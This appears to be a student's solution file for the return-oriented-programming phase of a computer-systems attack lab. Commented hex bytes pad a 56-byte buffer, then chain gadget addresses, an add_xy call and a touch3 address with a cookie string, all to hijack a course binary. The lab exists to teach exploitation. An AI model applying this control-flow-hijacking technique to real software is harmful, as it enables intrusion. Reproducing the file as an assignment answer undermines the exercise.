/* In phase3, I used 0x90 == no op for "NO-OP sled". However, we're not "injecting code", so
   there's no need to use 90 (although I suppose you could). Instead, I replaced 90 with 00 and filled the entire buffer (all 56 bytes) with it. */
/* "ea 20 40 00 00 00 00 00" little endian address is location of overwritten return address of phase 2 which is now the memory address in text of gadget 1. */
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 /* Buffer size == 56 bytes for me. Fill up buffer with padding and place gadget 1 address in memory location of return address which we previously overwrote in phase 2 with address into the buffer to execute injected code. */
ea 20 40 00 00 00 00 00 /* gadget 1: movq %rsp to %rax ==> text address 0x4020e8 + 2 bytes == 0x4020ea */
b0 1f 40 00 00 00 00 00 /* gadget 2: "move %rax to %rdi" ==> text address 0x401fae+2 bytes == 0x401fb0 */
fa 1f 40 00 00 00 00 00 /* gadget 3: "pop %rax" ==> text address */
00 00 00 00 00 00 00 00 /* empty row of 0s. This might be not correct for my version */
8d 20 40 00 00 00 00 00 /* gadget 4: movl %eax, %edx */
24 20 40 00 00 00 00 00 /* gadget 5: movl %edx, %ecx */ 
2e 20 40 00 00 00 00 00 /* gadget 6: movl %ecx, %esi */ 
09 20 40 00 00 00 00 00 /* add_xy function */
b0 1f 40 00 00 00 00 00 /* gadget 2: "move %rax to %rdi" ==> text address 0x401fae+2 bytes == 0x401fb0 */
fb 1e 40 00 00 00 00 00 /* touch 3 function address */
36 35 64 34 37 31 62 35 /* cookie ascii value */
